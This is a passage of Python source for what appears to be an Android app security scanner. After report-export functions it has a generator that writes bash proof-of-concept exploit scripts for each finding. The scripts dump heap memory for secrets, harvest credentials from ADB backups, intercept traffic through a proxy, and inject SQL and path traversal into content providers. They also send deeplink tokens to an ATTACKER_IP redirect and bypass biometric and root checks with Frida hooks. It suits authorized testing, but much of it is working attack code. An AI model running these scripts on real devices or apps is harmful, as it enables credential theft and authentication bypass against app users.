    h.append("<p>CONFIDENTIAL &mdash; This document contains proprietary security assessment data. Unauthorized distribution is prohibited.</p></footer>")
    h.append("</body></html>")
    return "\n".join(h)

def export_html(findings, apk, out, files=None):
    Path(out).write_text(_build_html_report(findings, apk, files), encoding="utf-8")

def export_pdf(findings, apk, out, files=None):
    sc = _sev_counts(findings)
    comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1)
    rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def esc(s): return str(s).replace("\\","\\\\").replace("(","\\(").replace(")","\\)")
    def pstream(lines):
        return "\n".join("BT /F1 {} Tf {} {} Td ({}) Tj ET".format(sz,x,y,esc(t)) for t,x,y,sz in lines)
    pages = []
    pg = [("ANDROID APPLICATION SECURITY ASSESSMENT REPORT",50,740,15),
          ("Application: "+apk,50,710,11),
          ("Date: "+now+"  |  Tool: "+APP_NAME+" v"+VERSION+"  |  Analyst: "+AUTHOR,50,692,9),
          ("",50,670,8),("EXECUTIVE SUMMARY",50,655,13),
          ("Risk Score: {:.1f}/10.0 ({})".format(avg,rl),50,635,11),
          ("Total: {}  Critical: {}  High: {}  Medium: {}  Low: {}  Info: {}".format(
              len(findings),sc["CRITICAL"],sc["HIGH"],sc["MEDIUM"],sc["LOW"],sc["INFO"]),50,617,9),
          ("",50,597,8),("ANDROID COMPONENTS",50,580,13),
          ("Package: "+comps.get("package","N/A"),50,562,9),
          ("Activities: {}  Services: {}  Receivers: {}  Providers: {}".format(
              len(comps["activities"]),len(comps["services"]),len(comps["receivers"]),len(comps["providers"])),50,546,9),
          ("Permissions: {}".format(len(comps["permissions"])),50,530,9)]
    y = 510
    for p in comps["permissions"][:20]:
        pg.append(("  - "+p.split(".")[-1],60,y,7)); y -= 11
    pages.append(pg)
    for i in range(0,len(findings),20):
        pg = [("SECURITY FINDINGS (Page {})".format(i//20+1),50,760,13)]
        y = 738
        for f in findings[i:i+20]:
            pg.append(("[{}] {} - {} (CVSS:{})".format(f.severity,f.id,f.title,f.cvss),50,y,8)); y-=11
            fn = f.file.split("/")[-1] if "/" in f.file else f.file
            pg.append(("  {}:{}  {}  Fix: {}".format(fn,f.line,f.cwe,f.fix[:55]),60,y,7)); y-=13
            if y < 50: break
        pages.append(pg)
    objs = ["<< /Type /Catalog /Pages 2 0 R >>", ""]
    fid = 3; objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>")
    pids = []
    for pl in pages:
        s = pstream(pl)
        sid = len(objs)+1; objs.append("<< /Length {} >>\nstream\n{}\nendstream".format(len(s.encode("latin-1","replace")),s))
        pid = len(objs)+1; objs.append("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents {} 0 R /Resources << /Font << /F1 {} 0 R >> >> >>".format(sid,fid))
        pids.append(pid)
    objs[1] = "<< /Type /Pages /Kids [{}] /Count {} >>".format(" ".join("{} 0 R".format(p) for p in pids),len(pids))
    pdf = "%PDF-1.4\n"; offs = []
    for i,o in enumerate(objs): offs.append(len(pdf)); pdf += "{} 0 obj\n{}\nendobj\n".format(i+1,o)
    xo = len(pdf); pdf += "xref\n0 {}\n0000000000 65535 f \n".format(len(objs)+1)
    for o in offs: pdf += "{:010d} 00000 n \n".format(o)
    pdf += "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n".format(len(objs)+1,xo)
    Path(out).write_bytes(pdf.encode("latin-1","replace"))

def export_docx(findings, apk, out, files=None):
    sc = _sev_counts(findings); comps = _extract_android_components(files or {})
    tc = sum(f.cvss for f in findings if isinstance(f.cvss,(int,float)))
    avg = tc/max(len(findings),1); rl = "CRITICAL" if avg>=9 else "HIGH" if avg>=7 else "MEDIUM" if avg>=4 else "LOW"
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def xe(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    def wp(t,b=False,sz=24,c="000000"):
        rp = ("<w:b/>" if b else "")+'<w:sz w:val="{}"/><w:color w:val="{}"/>'.format(sz,c)
        return '<w:p><w:r><w:rPr>{}</w:rPr><w:t xml:space="preserve">{}</w:t></w:r></w:p>'.format(rp,xe(t))
    def wtr(cells,b=False):
        return "<w:tr>"+"".join('<w:tc><w:p><w:r><w:rPr>{}</w:rPr><w:t xml:space="preserve">{}</w:t></w:r></w:p></w:tc>'.format("<w:b/>" if b else "",xe(c)) for c in cells)+"</w:tr>"
    body = wp("ANDROID APPLICATION SECURITY ASSESSMENT REPORT",True,36,"1a237e")+wp("")
    body += wp("Application: "+apk,True,28)+wp("Date: {} | Tool: {} v{} | Analyst: {}".format(now,APP_NAME,VERSION,AUTHOR),False,22,"666666")+wp("")
    body += wp("1. EXECUTIVE SUMMARY",True,30,"1a237e")+wp("")
    body += wp("Risk Score: {:.1f}/10.0 ({})".format(avg,rl),True,26)
    body += wp("Total: {} | Critical: {} | High: {} | Medium: {} | Low: {} | Info: {}".format(len(findings),sc["CRITICAL"],sc["HIGH"],sc["MEDIUM"],sc["LOW"],sc["INFO"]))
    body += wp("")+wp("2. ANDROID COMPONENTS",True,30,"1a237e")+wp("")
    body += wp("Package: "+comps.get("package","N/A"))
    body += wp("Activities: {} | Services: {} | Receivers: {} | Providers: {}".format(len(comps["activities"]),len(comps["services"]),len(comps["receivers"]),len(comps["providers"])))
    body += wp("")+wp("3. PERMISSIONS ({})".format(len(comps["permissions"])),True,30,"1a237e")+wp("")
    for pm in comps["permissions"]:
        dang = any(d in pm for d in ["CAMERA","CONTACTS","LOCATION","PHONE","SMS","STORAGE","RECORD_AUDIO"])
        body += wp("  "+pm+(" [DANGEROUS]" if dang else ""),False,20,"cc0000" if dang else "333333")
    body += wp("")+wp("4. SECURITY FINDINGS",True,30,"1a237e")+wp("")
    tbl = '<w:tbl><w:tblPr><w:tblBorders><w:top w:val="single" w:sz="4"/><w:left w:val="single" w:sz="4"/><w:bottom w:val="single" w:sz="4"/><w:right w:val="single" w:sz="4"/><w:insideH w:val="single" w:sz="4"/><w:insideV w:val="single" w:sz="4"/></w:tblBorders></w:tblPr>'
    tbl += wtr(["ID","Severity","Title","CWE","OWASP","CVSS","Location","Description","Evidence","Fix"],True)
    for f in findings: tbl += wtr([f.id,f.severity,f.title,f.cwe,f.owasp,str(f.cvss),"{}:{}".format(f.file,f.line),f.desc,f.evidence[:120],f.fix])
    body += tbl+"</w:tbl>"
    body += wp("")+wp("5. METHODOLOGY",True,30,"1a237e")+wp("")
    body += wp("Analysis: {} v{} with {} security rules + taint analysis.".format(APP_NAME,VERSION,len(RULES)))
    doc = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document {}><w:body>{}</w:body></w:document>'.format(ns,body)
    ct = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'
    rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
    wrels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>'
    with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',ct); zf.writestr('_rels/.rels',rels)
        zf.writestr('word/_rels/document.xml.rels',wrels); zf.writestr('word/document.xml',doc)

def export_xlsx(findings, apk, out, files=None):
    sc = _sev_counts(findings); comps = _extract_android_components(files or {})
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    def xe(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    def cell(c,r,v,s=0):
        ref = "{}{}".format(chr(65+c) if c<26 else "A"+chr(65+c-26),r)
        if isinstance(v,(int,float)): return '<c r="{}" s="{}"><v>{}</v></c>'.format(ref,s,v)
        return '<c r="{}" s="{}" t="inlineStr"><is><t>{}</t></is></c>'.format(ref,s,xe(str(v)[:200]))
    hdrs = ["ID","Severity","Title","CWE","OWASP","CVSS","File","Line","Description","Evidence","Fix"]
    rows = "<row r='1'>"+"".join(cell(i,1,h,1) for i,h in enumerate(hdrs))+"</row>"
    for ri,f in enumerate(findings):
        vals = [f.id,f.severity,f.title,f.cwe,f.owasp,f.cvss,f.file,f.line,f.desc,f.evidence[:200],f.fix]
        rows += "<row r='{}'>{}</row>".format(ri+2,"".join(cell(ci,ri+2,v) for ci,v in enumerate(vals)))
    s1 = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>{}</sheetData></worksheet>'.format(rows)
    sr = ""
    sd = [("Application",apk),("Date",now),("Tool",APP_NAME+" v"+VERSION),("Total",len(findings)),
          ("Critical",sc["CRITICAL"]),("High",sc["HIGH"]),("Medium",sc["MEDIUM"]),("Low",sc["LOW"]),("Info",sc["INFO"]),
          ("Package",comps.get("package","")),("Activities",len(comps["activities"])),("Services",len(comps["services"])),
          ("Receivers",len(comps["receivers"])),("Providers",len(comps["providers"])),("Permissions",len(comps["permissions"]))]
    for ri,(k,v) in enumerate(sd): sr += "<row r='{}'>{}{}</row>".format(ri+1,cell(0,ri+1,k,1),cell(1,ri+1,v))
    s2 = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>{}</sheetData></worksheet>'.format(sr)
    ct = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/></Types>'
    rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
    wbr = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/></Relationships>'
    wb = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Findings" sheetId="1" r:id="rId1"/><sheet name="Summary" sheetId="2" r:id="rId2"/></sheets></workbook>'
    sty = '<?xml version="1.0"?><styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><fonts count="2"><font><sz val="11"/><name val="Calibri"/></font><font><b/><sz val="11"/><name val="Calibri"/></font></fonts><fills count="2"><fill><patternFill patternType="none"/></fill><fill><patternFill patternType="gray125"/></fill></fills><borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders><cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs><cellXfs count="2"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/><xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1"/></cellXfs></styleSheet>'
    with zipfile.ZipFile(out,'w',zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',ct); zf.writestr('_rels/.rels',rels)
        zf.writestr('xl/_rels/workbook.xml.rels',wbr); zf.writestr('xl/workbook.xml',wb)
        zf.writestr('xl/styles.xml',sty); zf.writestr('xl/worksheets/sheet1.xml',s1); zf.writestr('xl/worksheets/sheet2.xml',s2)

# ============================================================
#  AUTO-POC GENERATOR  (creates working exploit scripts per finding)
# ============================================================
def generate_poc_scripts(findings, pkg, apk, out_dir):
    """Auto-generate working PoC exploit scripts for all findings."""
    os.makedirs(out_dir, exist_ok=True)
    generated = []

    # Master exploit runner script
    master = ["#!/bin/bash",
        "# ApkViper Auto-PoC Suite for: {}".format(pkg or apk),
        "# Generated: {}".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        "# WARNING: For authorized security testing only!",
        "PKG='{}'".format(pkg),
        "APK='{}'".format(apk),
        "echo '=== ApkViper Auto-PoC Suite ==='",
        "echo 'Target: $PKG ($APK)'", "echo ''", ""]

    poc_index = []
    for i, f in enumerate(findings):
        poc = _generate_single_poc(f, pkg, apk, i + 1)
        if poc:
            fname = "poc_{:02d}_{}.sh".format(i + 1, re.sub(r'[^a-zA-Z0-9]', '_', f.title)[:30].lower())
            fpath = os.path.join(out_dir, fname)
            Path(fpath).write_text(poc["script"], encoding="utf-8")
            generated.append({"finding": f.title, "severity": f.severity, "file": fname, "desc": poc["desc"]})
            poc_index.append("echo '[{}/{}] {} — {}'".format(i+1, len(findings), f.severity, f.title))
            poc_index.append("bash '{}' 2>/dev/null".format(fname))
            poc_index.append("echo ''")

    # Write master runner
    master.extend(poc_index)
    master.append("echo '=== PoC Suite Complete ==='")
    Path(os.path.join(out_dir, "run_all_pocs.sh")).write_text("\n".join(master), encoding="utf-8")

    # Write ADB video-ready automation script
    video_script = _generate_video_poc(findings, pkg, apk)
    Path(os.path.join(out_dir, "video_poc_demo.sh")).write_text(video_script, encoding="utf-8")

    # Write PoC index as JSON
    Path(os.path.join(out_dir, "poc_index.json")).write_text(
        json.dumps({"target": pkg, "apk": apk, "total_pocs": len(generated),
                     "generated": datetime.now().isoformat(), "pocs": generated}, indent=2), encoding="utf-8")

    return generated

def _generate_single_poc(f, pkg, apk, num):
    """Generate a working PoC script for a single finding."""
    title = f.title.lower()
    sev = f.severity
    poc = None

    if "debuggable" in title:
        poc = {"desc": "JDWP attach + heap dump + secret extraction",
         "script": """#!/bin/bash
# PoC: Debuggable Application Exploit
# CVE Reference: CVE-2024-31317, CVE-2024-0044
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'; APK='{apk}'
echo '[*] PoC: Debuggable Application — JDWP Memory Extraction'
echo '[1] Installing APK...'
adb install -r "$APK" 2>/dev/null
sleep 2
PID=$(adb shell pidof $PKG 2>/dev/null)
if [ -z "$PID" ]; then
    echo '[*] Starting app...'
    adb shell monkey -p $PKG -c android.intent.category.LAUNCHER 1 2>/dev/null
    sleep 3
    PID=$(adb shell pidof $PKG)
fi
echo "[+] PID: $PID"
echo '[2] Forwarding JDWP port...'
adb forward tcp:8700 jdwp:$PID
echo '[3] Dumping heap memory...'
adb shell am dumpheap $PID /data/local/tmp/heap.hprof 2>/dev/null
sleep 2
adb pull /data/local/tmp/heap.hprof /tmp/heap_$PKG.hprof 2>/dev/null
echo '[4] Extracting secrets from heap...'
if [ -f /tmp/heap_$PKG.hprof ]; then
    echo '=== SECRETS FOUND IN MEMORY ==='
    strings /tmp/heap_$PKG.hprof | grep -iE '(password|token|api.key|bearer|secret|private.key|session_id|auth)' | sort -u | head -30
    echo '=== END SECRETS ==='
else
    echo '[!] Could not pull heap dump (app may need to be running)'
fi
echo '[+] PoC complete. Connect debugger: jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700'
""".format(sev=sev, cvss=f.cvss, pkg=pkg, apk=apk)}

    elif "backup" in title:
        poc = {"desc": "ADB backup extraction + credential harvesting",
         "script": """#!/bin/bash
# PoC: Backup Enabled — Data Extraction
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Backup Data Extraction'
echo '[1] Triggering ADB backup (confirm on device)...'
adb backup -f /tmp/backup_$PKG.ab -apk $PKG
echo '[!] >>> TAP "BACK UP MY DATA" ON THE DEVICE NOW <<<'
sleep 15
echo '[2] Extracting backup...'
if command -v java &>/dev/null; then
    java -jar abe.jar unpack /tmp/backup_$PKG.ab /tmp/backup_$PKG.tar 2>/dev/null || dd if=/tmp/backup_$PKG.ab bs=1 skip=24 | openssl zlib -d > /tmp/backup_$PKG.tar 2>/dev/null
fi
mkdir -p /tmp/loot_$PKG
cd /tmp/loot_$PKG
tar xf /tmp/backup_$PKG.tar 2>/dev/null
echo '[3] Searching for credentials...'
echo '=== SharedPreferences ==='
find . -name '*.xml' -path '*/sp/*' -exec grep -l 'password\\|token\\|secret\\|key\\|session' {{}} \\; 2>/dev/null
echo '=== Databases ==='
find . -name '*.db' -exec sh -c 'echo "--- {{}} ---"; sqlite3 {{}} ".tables" 2>/dev/null' \\;
echo '=== Sensitive Strings ==='
grep -rn 'password\\|token\\|secret\\|api_key\\|session' . --include='*.xml' --include='*.json' 2>/dev/null | head -20
echo '[+] Loot saved to /tmp/loot_$PKG/'
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "cleartext" in title:
        poc = {"desc": "MITM traffic interception via mitmproxy",
         "script": """#!/bin/bash
# PoC: Cleartext Traffic Interception
# CVE Reference: CVE-2021-0341
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Cleartext Traffic MITM'
echo '[1] Setting device proxy...'
IP=$(ip route get 8.8.8.8 | awk '{{print $7}}' 2>/dev/null || echo '192.168.1.100')
adb shell settings put global http_proxy $IP:8080
echo "[+] Proxy set to $IP:8080"
echo '[2] Starting capture...'
echo '[*] Run: mitmproxy --mode transparent -p 8080'
echo '[*] Or: tcpdump on device:'
adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap -c 500 &
TCPID=$!
echo '[3] Launching app to generate traffic...'
adb shell monkey -p $PKG -c android.intent.category.LAUNCHER 1 2>/dev/null
sleep 10
echo '[4] Pulling capture...'
kill $TCPID 2>/dev/null
adb pull /sdcard/capture.pcap /tmp/capture_$PKG.pcap 2>/dev/null
echo '[5] Analyzing for plaintext credentials...'
if [ -f /tmp/capture_$PKG.pcap ]; then
    strings /tmp/capture_$PKG.pcap | grep -iE '(password|token|bearer|session|auth|api.key)' | head -20
fi
echo '[6] Cleaning up proxy...'
adb shell settings put global http_proxy :0
echo '[+] PoC complete'
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "exported component" in title:
        poc = {"desc": "Enumerate and exploit exported activities/providers/services",
         "script": """#!/bin/bash
# PoC: Exported Component Exploitation
# CVE Reference: CVE-2020-0096 (StrandHogg 2.0), CVE-2024-43093
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Exported Component Scanner + Exploit'
echo '[1] Enumerating exported components...'
echo '=== EXPORTED ACTIVITIES ==='
adb shell dumpsys package $PKG | grep -A1 'exported=true' | grep -oP '[\\w.]+Activity' | while read act; do
    echo "  [+] $act"
    echo "      Launching: adb shell am start -n $PKG/$act"
    adb shell am start -n $PKG/$act 2>/dev/null
    sleep 1
done
echo '=== CONTENT PROVIDERS ==='
adb shell dumpsys package $PKG | grep -oP 'content://[\\w./]+' | while read uri; do
    echo "  [+] $uri"
    RESULT=$(adb shell content query --uri "$uri" 2>/dev/null | head -3)
    if [ -n "$RESULT" ]; then
        echo "      DATA EXPOSED: $RESULT"
    fi
done
echo '=== BROADCAST RECEIVERS ==='
adb shell dumpsys package $PKG | grep -B1 'exported=true' | grep -oP '[\\w.]+Receiver' | while read recv; do
    echo "  [+] $recv"
done
echo '[+] PoC complete — review exposed components above'
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "webview" in title or "xss" in title.lower():
        poc = {"desc": "WebView JavaScript injection + file theft",
         "script": """#!/bin/bash
# PoC: Insecure WebView Exploitation
# CVE Reference: CVE-2025-0097, CVE-2012-6636
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '{{print $7}}' || echo '127.0.0.1')
echo '[*] PoC: WebView JavaScript Injection'
echo '[1] Testing URL injection via deeplink...'
adb shell am start -a android.intent.action.VIEW -d "https://$ATTACKER_IP:8443/xss?q=<script>alert(document.cookie)</script>" -n $PKG/.MainActivity 2>/dev/null
sleep 2
echo '[2] Testing javascript: scheme injection...'
adb shell am start -a android.intent.action.VIEW -d "javascript:document.title='XSS'" -n $PKG/.WebViewActivity 2>/dev/null
sleep 2
echo '[3] Testing file:// scheme for local file access...'
adb shell am start -a android.intent.action.VIEW -d "file:///data/data/$PKG/shared_prefs/" -n $PKG/.WebViewActivity 2>/dev/null
echo '[+] Check device screen for XSS execution or file listing'
echo '[*] For full exploitation use Frida:'
echo "    frida -U -f $PKG -l webview_exploit.js"
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "sql injection" in title or "content provider injection" in title:
        poc = {"desc": "SQL injection via content provider",
         "script": """#!/bin/bash
# PoC: SQL Injection via Content Provider
# CVE Reference: CVE-2024-23706
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Content Provider SQL Injection'
echo '[1] Finding content providers...'
PROVIDERS=$(adb shell dumpsys package $PKG | grep -oP '(?<=authority=)[\\w.]+')
for auth in $PROVIDERS; do
    URI="content://$auth/"
    echo "[2] Testing: $URI"
    echo '  Basic query:'
    adb shell content query --uri "$URI" 2>/dev/null | head -3
    echo '  SQL injection (UNION):'
    adb shell content query --uri "$URI" --where "1=1) UNION SELECT sql,name,type FROM sqlite_master--" 2>/dev/null | head -5
    echo '  Path traversal:'
    adb shell content read --uri "${{URI}}../../../../etc/hosts" 2>/dev/null | head -3
done
echo '[+] PoC complete'
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "hardcoded secret" in title or "hardcoded crypto" in title or "api key" in title.lower():
        poc = {"desc": "Extract and validate hardcoded secrets",
         "script": """#!/bin/bash
# PoC: Hardcoded Secret Extraction
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'; APK='{apk}'
echo '[*] PoC: Hardcoded Secret Extraction + Validation'
echo '[1] Decompiling APK...'
TMPDIR=$(mktemp -d)
unzip -q "$APK" -d "$TMPDIR" 2>/dev/null
echo '[2] Scanning for secrets...'
echo '=== API KEYS ==='
grep -rn 'AIza[0-9A-Za-z_-]{{35}}' "$TMPDIR" 2>/dev/null | head -5
echo '=== AWS KEYS ==='
grep -rn 'AKIA[0-9A-Z]{{16}}' "$TMPDIR" 2>/dev/null | head -5
echo '=== FIREBASE ==='
grep -rn 'firebaseio.com' "$TMPDIR" 2>/dev/null | head -5
echo '=== PRIVATE KEYS ==='
grep -rn 'BEGIN.*PRIVATE KEY' "$TMPDIR" 2>/dev/null | head -5
echo '=== GENERIC SECRETS ==='
strings "$TMPDIR"/classes*.dex 2>/dev/null | grep -iE '(api_key|secret_key|password|token|auth)\\s*[=:]\\s*[A-Za-z0-9+/=]{{8,}}' | head -10
echo '[3] Testing Firebase URL...'
FB=$(grep -ohP 'https://[\\w-]+\\.firebaseio\\.com' "$TMPDIR" -r 2>/dev/null | head -1)
if [ -n "$FB" ]; then
    echo "  Testing: $FB"
    curl -s "$FB/.json" | head -c 500
fi
rm -rf "$TMPDIR"
echo '[+] PoC complete'
""".format(sev=sev, cvss=f.cvss, pkg=pkg, apk=apk)}

    elif "deeplink" in title:
        poc = {"desc": "Deeplink parameter injection + redirect",
         "script": """#!/bin/bash
# PoC: Deeplink Hijacking
# CVE Reference: CVE-2025-0097
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Deeplink Parameter Injection'
echo '[1] Extracting registered schemes...'
adb shell dumpsys package $PKG | grep -A10 'intent-filter' | grep -E 'scheme|host|path'
echo '[2] Testing common deeplink injections...'
ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '{{print $7}}' || echo '127.0.0.1')
SCHEMES=$(adb shell dumpsys package $PKG | grep -oP '(?<=scheme=")[\\w]+' | sort -u)
for scheme in $SCHEMES; do
    echo "  Testing scheme: $scheme"
    adb shell am start -a android.intent.action.VIEW -d "$scheme://auth/callback?token=STOLEN&redirect=https://$ATTACKER_IP:8443/callback" 2>/dev/null
    sleep 1
    adb shell am start -a android.intent.action.VIEW -d "$scheme://webview?url=javascript:alert(document.domain)" 2>/dev/null
    sleep 1
done
echo '[+] Check device screen for redirect or JS execution'
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "ssl" in title or "certificate" in title or "trust all" in title:
        poc = {"desc": "MITM via certificate bypass",
         "script": """#!/bin/bash
# PoC: SSL/Certificate Bypass MITM
# CVE Reference: CVE-2021-0341
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: HTTPS Interception (app trusts all certs)'
echo '[1] Check mitmproxy installed...'
if ! command -v mitmproxy &>/dev/null; then
    echo '  Install: pip install mitmproxy'
fi
IP=$(ip route get 8.8.8.8 | awk '{{print $7}}' 2>/dev/null || echo '192.168.1.100')
echo "[2] Push mitmproxy CA to device..."
adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/mitmproxy-ca.cer 2>/dev/null
echo "[3] Set proxy to $IP:8080..."
adb shell settings put global http_proxy $IP:8080
echo '[4] Start mitmproxy in background...'
echo "  Run: mitmproxy -p 8080"
echo "  Or:  mitmdump -p 8080 -w /tmp/traffic_$PKG.flow"
echo '[5] Launch app...'
adb shell monkey -p $PKG -c android.intent.category.LAUNCHER 1 2>/dev/null
echo '[*] All HTTPS traffic should be visible in mitmproxy now!'
echo '[*] Press Ctrl+C to stop, then clean proxy:'
echo "  adb shell settings put global http_proxy :0"
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "biometric" in title or "fingerprint" in title:
        poc = {"desc": "Bypass biometric authentication via Frida",
         "script": """#!/bin/bash
# PoC: Biometric Authentication Bypass
# CVE Reference: CVE-2025-26633
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Biometric Authentication Bypass'
cat > /tmp/biometric_bypass.js << 'FRIDASCRIPT'
Java.perform(function() {{
    try {{
        var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
        BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(info) {{
            console.log('[BYPASS] BiometricPrompt intercepted — triggering success');
            var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
            this.mAuthenticationCallback.value.onAuthenticationSucceeded(AuthResult.$new(null));
        }};
        console.log('[+] BiometricPrompt bypass active');
    }} catch(e) {{ console.log('[!] ' + e); }}
    try {{
        var KM = Java.use('android.app.KeyguardManager');
        KM.isDeviceLocked.implementation = function() {{ return false; }};
        KM.isKeyguardLocked.implementation = function() {{ return false; }};
        console.log('[+] KeyguardManager bypass active');
    }} catch(e) {{}}
}});
FRIDASCRIPT
echo '[1] Launching app with Frida bypass...'
frida -U -f $PKG -l /tmp/biometric_bypass.js --no-pause
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "root detection" in title:
        poc = {"desc": "Bypass root/SafetyNet detection via Frida",
         "script": """#!/bin/bash
# PoC: Root Detection Bypass
# Severity: {sev} | CVSS: {cvss}
PKG='{pkg}'
echo '[*] PoC: Root Detection Bypass'
cat > /tmp/root_bypass.js << 'FRIDASCRIPT'
Java.perform(function() {{
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {{
        var path = this.getAbsolutePath();
        if (/su$|magisk|supersu|busybox|Superuser/i.test(path)) {{
            console.log('[ROOT-BYPASS] Hiding: ' + path);
            return false;
        }}
        return this.exists();
    }};
    var Build = Java.use('android.os.Build');
    Build.TAGS.value = 'release-keys';
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {{
        if (/which su|su /i.test(cmd)) {{
            throw Java.use('java.io.IOException').$new('not found');
        }}
        return this.exec(cmd);
    }};
    console.log('[+] Root detection bypassed');
}});
FRIDASCRIPT
echo '[1] Launching with root bypass...'
frida -U -f $PKG -l /tmp/root_bypass.js --no-pause
""".format(sev=sev, cvss=f.cvss, pkg=pkg)}

    elif "0-day" in title or "AV-CVE" in f.id:
        poc = {"desc": "NEW vulnerability discovery — potential 0-day",
         "script": """#!/bin/bash
# PoC: NEW VULNERABILITY DISCOVERY (Potential 0-day)
# Finding: {title}
# CWE: {cwe} | CVSS: {cvss}
# This pattern matches known CVE attack surfaces but may be a NEW vulnerability
PKG='{pkg}'
echo '[*] PoC: {title}'
echo '[!] POTENTIAL 0-DAY VULNERABILITY DETECTED'
echo '    CWE: {cwe}'
echo '    CVSS: {cvss}'
echo '    Evidence: {evidence}'
echo ''
echo '[*] This vulnerability matches patterns from known CVEs:'
echo '    - CVE-2024-49415 (Samsung zero-click via media decoder)'
echo '    - CVE-2023-20963 (Parcel mismatch privilege escalation)'
echo '    - CVE-2021-0691 (ZIP path traversal code execution)'
echo ''
echo '[1] Recommended exploitation steps:'
echo '    1. Decompile: jadx -d output/ {apk}'
